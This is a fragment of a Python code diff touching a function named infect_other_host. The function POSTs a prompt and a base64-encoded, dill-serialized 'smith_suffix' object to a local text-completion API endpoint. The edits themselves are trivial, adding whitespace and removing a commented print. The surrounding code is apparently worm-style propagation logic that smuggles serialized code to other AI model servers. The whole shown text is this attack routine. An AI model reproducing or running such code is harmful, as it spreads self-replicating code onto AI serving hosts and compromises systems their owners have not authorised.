@@ -41,6 +41,7 @@ def infect_other_host(time, random, http_client, json, base64, dill):
         try:
             connection = http_client.HTTPConnection('127.0.0.1', port)
             headers = {'Content-type': 'application/json'}
+            
             req = {
                 'prompt': smith_prompt,
                 'suffix': base64.b64encode(dill.dumps(smith_suffix)).decode(),
@@ -48,7 +49,7 @@ def infect_other_host(time, random, http_client, json, base64, dill):
                 'max_tokens': smith_max_tokens,
                 'temperature': 0.1,
             }
-            # print('!', req)
+            
             connection.request('POST', '/api/text-completion', json.dumps(req), headers)
             response = connection.getresponse()
             print(response.read().decode())
